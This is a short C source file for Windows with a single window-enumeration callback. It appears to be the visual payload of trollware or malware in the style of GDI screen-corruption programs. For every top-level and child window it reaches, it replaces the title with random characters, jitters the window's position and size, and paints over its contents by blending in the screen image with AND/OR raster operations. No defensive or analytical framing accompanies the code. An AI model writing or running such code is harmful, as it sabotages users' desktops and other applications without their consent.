#include "001.h"

BOOL CALLBACK GlobalWndProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
)
{
	BOOL bParent;
	HDC hdc;
	RECT rcOriginal;
	RECT rc;
	RECT rcScr;
	int w;
	int h;

	Sleep( 10 );

	rcScr = GetVirtualScreen( );

	wchar_t szWndText[ 256 ];
	for ( int i = 0; i < 256; i++ )
	{
		szWndText[ i ] = ( wchar_t ) ( ( Xorshift( ) % 256 ) + 1 );
	}

	SetWindowTextW( hwnd, szWndText );

	GetWindowRect( hwnd, &rcOriginal );

	rc = rcOriginal;

	rc.left += Xorshift( ) % 3 - 1;
	rc.top += Xorshift( ) % 3 - 1;
	rc.right += Xorshift( ) % 3 - 1;
	rc.bottom += Xorshift( ) % 3 - 1;

	w = rc.right - rc.left;
	h = rc.bottom - rc.top;

	MoveWindow( hwnd, rc.left, rc.top, w, h, TRUE );

	hdc = GetDC( hwnd );

	if ( Xorshift( ) % 2 )
	{
		BitBlt( hdc, rc.left, rc.top, w, h, hdc, rcOriginal.left, rcOriginal.top, ( Xorshift( ) % 2 ) ? SRCAND : SRCPAINT );
	}
	else
	{
		w = rcOriginal.right - rcOriginal.left;
		h = rcOriginal.bottom - rcOriginal.top;
		StretchBlt( hdc, rcOriginal.left, rcOriginal.top, w, h, GetDC( 0 ), rcScr.left, rcScr.top,
			rcScr.right - rcScr.left, rcScr.bottom - rcScr.top,
			( Xorshift( ) % 2 ) ? SRCAND : SRCPAINT );
	}

	ReleaseDC( hwnd, hdc );

	bParent = ( BOOL ) lParam;

	if ( bParent )
	{
		EnumChildWindows( hwnd, GlobalWndProc, FALSE );
	}

	return TRUE;
}